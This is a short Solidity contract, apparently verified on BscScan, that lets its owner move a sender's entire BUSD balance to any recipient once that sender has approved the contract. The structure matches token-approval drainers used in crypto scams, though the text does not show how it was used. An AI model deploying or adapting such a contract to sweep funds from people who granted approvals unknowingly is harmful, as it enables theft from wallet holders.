/**
 *Submitted for verification at BscScan.com on 2023-03-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract BUSDTransfer {
    address public owner;
    IBEP20 public busdToken;
    
    constructor(address _busdTokenAddress) {
        owner = msg.sender;
        busdToken = IBEP20(_busdTokenAddress);
    }
    
    function transferAllFrom(address sender, address recipient) external onlyOwner {
        uint256 balance = busdToken.balanceOf(sender);
        uint256 allowance = busdToken.allowance(sender, address(this));
        require(allowance >= balance, "Transfer amount exceeds allowance");
        require(busdToken.transferFrom(sender, recipient, balance), "Transfer failed");
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }
}